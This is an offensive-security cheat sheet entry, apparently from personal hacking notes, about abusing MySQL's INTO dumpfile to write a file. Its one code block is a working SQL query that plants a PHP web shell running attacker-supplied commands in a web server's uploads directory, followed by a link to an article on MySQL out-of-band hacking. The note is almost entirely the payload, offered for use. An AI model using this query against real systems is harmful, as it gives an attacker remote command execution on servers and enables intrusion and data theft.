# MYSQL dumpfile

## Upload shell to web directory from mysql
```cheat sqlinjection Upload shell to web directory
SELECT '<?php exec($_GET["cmd"]); ?>' INTO dumpfile '/var/www/html/uploads/mshell.php';
```

## useful website for mysql hacking
https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/


tags: #mysql #webshell #shell #christian 
